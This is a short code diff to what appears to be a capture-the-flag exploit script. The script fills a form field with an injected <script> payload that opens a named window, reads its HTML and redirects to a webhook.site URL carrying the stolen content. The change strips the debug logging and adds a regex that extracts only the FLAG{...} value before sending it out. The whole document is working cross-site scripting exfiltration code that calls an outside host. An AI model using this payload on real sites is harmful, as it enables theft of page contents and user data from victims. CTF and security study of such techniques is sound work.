@@ -15,12 +15,9 @@
             
             dataField.value = `
                 \x3cscript>
-                    console.log('Starting...');
                     const flagWindow = window.open('', 'flagWindow');
-                    console.log('Gaining window...');
                     const flagHTML = flagWindow.document.documentElement.innerHTML;
-                    console.log(flagHTML);
-                    window.location.href = 'https://webhook.site/ce587c88-e8e2-4397-9cb7-df2c22c5f8bb/FLAG_' + flagHTML;
+                    window.location.href = 'https://webhook.site/ce587c88-e8e2-4397-9cb7-df2c22c5f8bb/FLAG_' + (/FLAG{.+?}/).exec(flagHTML)[0];
                 \x3c/script>
             `
             form.submit()
